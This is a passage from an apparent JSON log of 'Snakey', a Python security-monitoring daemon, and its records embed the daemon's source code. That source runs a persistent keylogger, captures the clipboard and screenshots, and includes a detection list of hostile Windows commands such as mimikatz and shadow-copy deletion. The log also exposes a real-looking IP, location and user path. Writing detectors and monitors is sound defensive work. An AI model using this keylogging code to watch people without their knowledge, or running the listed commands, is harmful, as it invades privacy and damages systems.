hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file (Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "4af17c4159aae5744e1bca3b7190ff1239309c8b960dce2fd0be3bf45ddee799", "_raw_log_hash": "02a3e835f887cc6c1500b6d93204a0d498559afd0cffa7aafdb545cca326db1b"}
{"timestamp": "2025-06-11T17:09:21.365205+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return 